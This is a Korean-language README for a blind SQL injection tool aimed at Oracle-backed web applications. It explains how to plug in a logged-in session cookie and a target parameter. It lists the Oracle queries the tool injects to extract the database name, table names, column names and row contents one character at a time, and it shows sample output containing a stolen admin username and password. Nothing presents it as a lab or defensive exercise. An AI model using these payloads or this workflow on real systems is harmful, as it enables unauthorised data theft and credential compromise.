````markdown
# BlindSQL_wizard.py

**Boolean-based Blind SQL Injection 자동화 도구 (Oracle 지원)**  
Oracle 기반 웹 애플리케이션을 대상으로 DB 이름, 테이블, 컬럼, 내부 데이터를 추출하는 Blind SQLi 자동화 스크립트입니다.

---

## 요구사항

- Python 3.x
- `requests` 라이브러리  
  ```bash
  pip install requests
````

---

## 사용법

1. **JSESSIONID 설정**

   ```python
   headers = {
       "User-Agent": "Mozilla/5.0",
       "Content-Type": "application/x-www-form-urlencoded",
       "Cookie": "JSESSIONID=EXAMPLE"  # ← 실제 로그인 세션 쿠키로 변경
   }
   ```

2. **공격 파라미터 입력**

   * `paramName`: 공격 대상 파라미터 이름 (예: `"userId"`)
   * `constant_param`: 고정 로그인 파라미터 (예: `{"userPw": "dummy"}`)

3. **실행**

   ```bash
   python BlindSQL_wizard.py
   ```

---

## 기능 요약

*  Boolean-based Blind SQLi 자동화
*  Oracle DB 전용 쿼리 분기 처리
*  DB 이름, 테이블, 컬럼, 일부 데이터 추출
*  `ROWNUM` 기반 페이징 처리
*  JSON 형식으로 결과 저장

---

## 🔍 내부 동작

### 1. DB 이름 추출

```sql
SELECT SYS_CONTEXT('USERENV','DB_NAME') FROM dual
```

### 2. 테이블 목록 추출

```sql
SELECT table_name FROM (
  SELECT table_name, ROWNUM r FROM user_tables WHERE ROWNUM <= 100
) WHERE r = {i}
```

### 3. 컬럼 목록 추출

```sql
SELECT column_name FROM (
  SELECT column_name, ROWNUM r FROM user_tab_columns WHERE table_name = '{table}'
) WHERE r = {i}
```

### 4. 데이터 추출

```sql
SELECT TO_CHAR({col}) FROM (
  SELECT {col}, ROWNUM r FROM {table}
) WHERE r = {i}
```

모든 문자열 추출은 `ASCII` 값 비교로 한 글자씩 Boolean 조건문을 통해 얻어집니다.

---

## 결과 예시

결과는 `blind_extracted_result.json`에 자동 저장됩니다.

```json
{
  "database": "ORCL",
  "tables": {
    "USERS": {
      "columns": ["ID", "PASSWORD"],
      "data": [
        {
          "ID": "admin",
          "PASSWORD": "admin123"
        },
        ...
      ]
    }
  }
}
```

